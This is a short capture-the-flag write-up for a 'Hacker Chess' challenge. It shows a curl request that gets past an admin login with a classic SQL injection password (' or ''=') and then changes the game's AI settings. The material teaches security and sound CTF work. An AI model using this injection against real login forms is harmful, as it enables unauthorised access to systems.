# Episode 0: Challenge 1
## Description
> A clean and fair game of chess. Careful though, this is not a game for grandmasters to win.
> 
> Hint: Don't make this game harder than it needs to be. 
A link to an online chess game was attached.
## Solution
The link leads us to an online chess game called "Hacker Chess". In this game we can compete with the computer. 
If it's not hard enough to win as-is, at some point the computer suddenly starts cheating by turning all of its pawns into queens!
On the bottom left corner of the screen, we have a link to the "Master Login":
```html
Master Login
```
It's protected by a username and password:
```html
		username: 
		password: 
```
Luckily, the most basic SQL injection can bypass it:
```console
┌──(user@kali)-[/media/sf_CTFs/h4ck1ng.google/EP000]
└─$ curl 'https://hackerchess-web.h4ck.ctfcompetition.com/admin.php' -X POST --data-raw 'username=admin&password=%27+or+%27%27%3D%27' -L -c cookiejar
        Secret Admin Panel
        Change config of the Chess AI!
                Thinking Time: 
          AI Queen Cheats:  Yes  No
```
In the admin panel, it looks like we can limit the computer's thinking time AND disable cheats. So, we provide a negative thinking time to force the computer to make rash decisions and disable the cheats, making it much easier to beat the AI:
